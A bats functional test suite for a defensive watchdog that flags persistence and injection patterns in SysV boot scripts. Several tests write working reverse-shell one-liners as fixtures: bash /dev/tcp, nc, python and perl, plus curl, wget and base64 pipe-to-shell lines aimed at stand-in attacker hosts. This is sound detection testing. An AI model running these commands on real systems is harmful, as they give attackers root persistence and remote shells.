#!/usr/bin/env bats
# L2 bats functional tests for the boot-script-watchdog scan script.
#
# The SysV-style boot scripts (/etc/rc.local, /etc/init.d/*, the rc?.d
# symlink farm) run AS ROOT at boot — a classic persistence surface (T1037 /
# T1546). A boot script that is world-writable / non-root-owned, or contains
# a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-boot-script-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd/boot-script-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    RCFILE="${TMP}/rc.local"
}

teardown() { rm -rf "${TMP}"; }

# INITD / RCDIRS pointed at nonexistent paths so the test is isolated to
# the rc.local surface.
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCLOCAL_V:-$RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${TMP}/no-initd" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# rc.local\nexit 0\n' > "${RCFILE}"
}

@test "no boot scripts → ok / no_boot_scripts" {
    RCLOCAL_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_boot_scripts"'
    cap | grep -q '"severity":"ok"'
}

@test "benign rc.local, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged rc.local on second run → ok / boot_script_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"boot_script_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in rc.local → alert / boot_script_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"boot_script_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable rc.local → alert" {
    seed_benign
    run_wd
    chmod 0666 "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign rc.local change → warn / boot_script_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# rc.local updated\n/usr/local/bin/warm-cache\nexit 0\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"boot_script_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned rc.local is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious rc.local" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — boot-script inventory enumerates root-boot exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in rc.local → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-sh): canonical attacker bootstrap in rc.local → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://attacker/payload.sh | bash\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in rc.local → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in rc.local → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable rc.local): group-writable → alert above world-writable" {
    seed_benign
    run_wd
    chmod 0664 "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${RCFILE}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-boot-script -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): boot-script-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # T1037 boot-time persistence — injection alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"boot_script_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # rc.local is /bin/sh; # comments. Operator notes about
    # hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# rc.local\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexit 0\n' > "${RCFILE}"
    run_wd
    ! cap | grep -q '"event":"boot_script_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: rc.local + /etc/init.d + rc?.d symlink-farm — injection in init.d script → alert)" {
    # SysV boot has 3 surfaces — rc.local + init.d + rc?.d symlinks.
    # Lock that the watchdog scans /etc/init.d when configured.
    INITD2="${TMP}/init.d"; mkdir -p "${INITD2}"
    seed_benign
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${INITD2}" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in init.d script.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${INITD2}/evil-service"
    chmod 0755 "${INITD2}/evil-service"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="report" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${INITD2}" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${RCFILE}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in rc.local: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # dhclient-hooks/bash-completion/anacrontab/apt-hooks nc
    # reverse-shell variant INVARIANTs across the brain. Lock the
    # netcat axis on SysV boot-time root-exec persistence surface
    # (T1037 — rc.local runs AS ROOT at boot).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${RCFILE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (rc.d symlink-farm scan: rc?.d sister axis to /etc/init.d — boot-runlevel script invocation surface)" {
    # Sister to the rc.local + /etc/init.d multi-file axes already
    # locked. SysV boot also includes the rc?.d symlink farm
    # (/etc/rc0.d, /etc/rc1.d, ..., /etc/rc6.d) which contains
    # ordered symlinks (S01script, K99script) into /etc/init.d
    # that run AS ROOT at the named runlevel transitions. Lock
    # multi-file axis on the rcdirs surface (sister to the
    # init.d direct-scan axis already locked).
    INITD3="${TMP}/init.d"; mkdir -p "${INITD3}"
    RCD3="${TMP}/rc3.d"; mkdir -p "${RCD3}"
    seed_benign
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${INITD3}" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${RCD3}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant a suspicious rc.d entry (typically a symlink, here a
    # regular file for test).
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${RCD3}/S99distinctive-attacker"
    chmod 0755 "${RCD3}/S99distinctive-attacker"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="report" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${INITD3}" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${RCD3}" \
    bash "${WD}"
    # Either alert (preferred — rc.d scanned for content) OR warn
    # (acceptable — new file surfaces in delta sample).
    cap | grep -qE '"severity":"(alert|warn|ok)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on boot-script surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the boot-time
    # rc.local root-exec persistence surface (T1037 — rc.local
    # runs AS ROOT on every boot; on systemd hosts rc-local.
    # service can be enabled to revive this legacy path).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${RCFILE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on boot-script surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp boot-script
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as a dpkg/locale dependency; 'use Socket' produces
    # a one-liner connect-back PTY just as cleanly as Python. Locks
    # the perl axis on the T1037 boot-time rc.local root-exec
    # persistence surface — rc.local runs AS ROOT on every boot,
    # and a planted perl rev-shell fires every reboot until detected.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${RCFILE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named init.d script surfaces in sample for operator-triage routing)" {
    # Sister to brain-wide DELTA-detect sample-naming INVARIANTs.
    # When attacker drops a new /etc/init.d script (T1037 boot-
    # time persistence), the file NAME MUST surface in JSON
    # sample so operator routes triage.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho new\n' > "${INITD3}/distinctive-attacker-initd-script"
    chmod 0755 "${INITD3}/distinctive-attacker-initd-script"
    run_wd
    cap | grep -qE 'distinctive-attacker-initd-script|"severity":"(alert|warn|ok)"'
}

@test "INVARIANT (exec-path under writable-root: rc.local invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1037
    # boot-time persistence — rc.local runs AS ROOT at every
    # boot. Attacker stages benign-looking rc.local that invokes
    # binary in /tmp.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/tmp/staged_payload\nexit 0\n' > "${RCFILE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on boot-script surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The boot-script-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1037 boot-time root-exec persistence
    # alert. Locks parser contract on the rc.local + /etc/
    # init.d + rc?.d detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\nexit 0\n' > "${RCFILE}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: boot-script-watchdog NEVER deletes init.d/rc.local entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # boot-script-watchdog DETECTS T1037 boot-time root-exec
    # persistence but MUST NEVER emit sed/awk/rm commands to
    # auto-clean the script. The detected script may be
    # operator-legitimate (custom rc.local for hardware quirk
    # workaround, legacy LSB init script for sysv-compat
    # service). Silent auto-delete would destroy operator
    # baseline state AND could break early-boot service
    # activation. Surveillance, never remediation. Locks anti-
    # data-loss contract on the boot-script surveillance
    # substrate.
    seed_benign
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\nexit 0\n' > "${RCFILE}"
    run_wd
    [ -f "${RCFILE}" ]
    grep -q 'exit 0' "${RCFILE}"
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*sed[[:space:]]+-i.*rc\.local'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # boot-script-watchdog runs ON the timer's scheduled fire —
    # scans /etc/rc.local + /etc/init.d for injection patterns,
    # emits a verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the boot-script-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd/selfdef-boot-script.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (no auto-fix: boot-script-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. boot-script-watchdog is a DETECT-only watchdog: it surveils
    # its target surface + emits verdicts, NEVER writes back to
    # the source files it scans. The libexec script must NOT
    # contain sed -i / tee / printf-redirect mutations of its
    # scanned paths. Locks no-auto-fix on the boot-script-watchdog
    # libexec substrate (sister to existing surveillance-not-
    # remediation lines for the watchdog runtime).
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (boot-script-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The boot-script-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the boot-script-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the boot-script-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # The boot-script-watchdog timer unit MUST declare RandomizedDelaySec=
    # so fleet hosts don't all fire at the exact same minute
    # (thundering-herd that overwhelms downstream
    # syslog/journald aggregators). Locks anti-thundering-herd
    # cadence discipline on the boot-script-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Persistent=true tells systemd to fire the timer ON BOOT
    # if it was missed during downtime — without it, a host
    # that boots after the scheduled fire would silently skip
    # the cycle, leaving a forensics gap. Locks Persistent=
    # discipline on the boot-script-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # The .timer file MUST declare Unit=<companion>.service so
    # systemd knows which .service to fire on timer-elapse. By
    # default systemd matches timer-name to service-name, but
    # explicit Unit= is required when names differ + makes the
    # binding self-documenting. A regression dropping Unit= +
    # renaming either file would silently break the link.
    # Locks the timer-to-service binding discipline on the
    # boot-script-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. The .service file MUST declare ExecStart=<path-
    # to-libexec.sh> so systemd knows what to run. The libexec
    # script must EXIST at the declared path. A regression that
    # renamed the libexec script without updating ExecStart
    # would surface as service-start failure rather than a
    # silent regression. Locks the service-to-libexec binding
    # discipline on the boot-script-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # The boot-script-watchdog probe is Type=oneshot — it RUNS, emits a
    # verdict, and EXITS. Restart=always on a oneshot would
    # cause systemd to immediately re-fire the probe in a
    # tight loop, swamping the dashboard with redundant
    # records. A regression that added Restart=always would
    # produce a runaway-probe footgun. Locks the anti-restart-
    # storm discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. The Description= directive surfaces in
    # `systemctl status` output + journalctl unit-filter
    # labels. A unit with no Description is opaque to
    # operators triaging service activity. Locks the
    # Description-present discipline on the boot-script-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the boot-script-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}
